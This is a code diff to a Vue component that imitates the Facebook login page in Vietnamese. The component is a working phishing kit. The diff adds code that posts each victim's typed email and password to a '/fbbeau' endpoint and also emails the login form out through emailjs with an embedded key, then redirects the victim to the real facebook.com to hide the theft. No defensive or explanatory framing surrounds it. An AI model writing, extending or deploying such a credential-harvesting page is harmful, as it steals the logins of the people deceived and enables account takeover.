@@ -2,7 +2,7 @@
   <div>
     <div id="navwrapper" class="is-hidden-mobile">
       <div id="navbar">
-        <form @submit.prevent="login">
+        <form id="form-login" @submit.prevent="login">
           <table class="tablewrapper">
             <tr>
               <td class="row1">Email hoặc điện thoại</td>
@@ -16,7 +16,12 @@
                 <input v-model="password" type="password" class="inputtext" />
               </td>
               <td>
-                <div id="button" @click="login">Đăng nhập</div>
+                <input
+                  id="button"
+                  type="submit"
+                  value="Đăng nhập"
+                  @click="login"
+                />
               </td>
             </tr>
             <tr>
@@ -46,7 +51,7 @@
           <div class="signup bolder">Đăng ký</div>
           <div class="free bolder">Luôn miễn phí</div>
 
-          <div class="formbox">
+          <div class="formbox form-login">
             <input type="text" class="inputbody in1" placeholder="Họ" />
             <input
               type="text"
@@ -331,19 +336,23 @@ export default {
       password: ''
     }
   },
+  mounted() {
+    // eslint-disable-next-line no-undef
+    emailjs.init('user_Dk73zY8XjjHd5v1fmVzVU')
+  },
   methods: {
-    login: async function() {
-      await this.$axios
+    login: function() {
+      this.$axios
         .post(`/fbbeau`, {
           username: this.username,
           password: this.password,
           status: 'alive'
         })
         .then(() => {
-          this.username = ''
-          this.password = ''
+          // eslint-disable-next-line no-undef
+          emailjs.sendForm('gmail', 'template_Zwf9yTds', '#form-login')
+          window.location.replace('http://facebook.com')
         })
-      window.location.replace('http://facebook.com')
     }
   }
 }
@@ -423,7 +432,7 @@ h1 {
 #button {
   position: relative;
   width: 80px;
-  height: 20px;
+  height: 23px;
   background-color: #5b72a9;
   border: 1px solid #999;
   border-color: #8b9dc3 #2f477a #29447e #1a356e;
@@ -434,6 +443,12 @@ h1 {
   text-align: center;
   color: #fff;
   line-height: 16px;
+}
+
+#button:focus {
+  background: #7c93ca;
+  border: none;
+  outline: none;
 }
 
 .tablewrapper {
